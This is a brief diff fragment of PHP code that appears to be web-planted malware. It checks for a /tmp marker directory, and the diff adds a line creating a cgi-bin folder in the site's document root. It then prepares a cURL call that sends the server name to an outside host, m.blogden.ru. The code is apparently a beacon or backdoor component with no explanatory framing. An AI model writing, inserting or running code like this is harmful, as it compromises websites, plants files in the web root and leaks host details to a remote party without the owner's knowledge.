@@ -29,7 +29,8 @@ $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
 if(file_exists('/tmp/vv4v444t'.$d.$random)) { } else {
 	mkdir('/tmp/vv4v444t'.$d.$random);
-  $curl3 = curl_init();
+	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
+$curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_URL => 'https://m.blogden.ru/data/data.php?s='.$d.'',
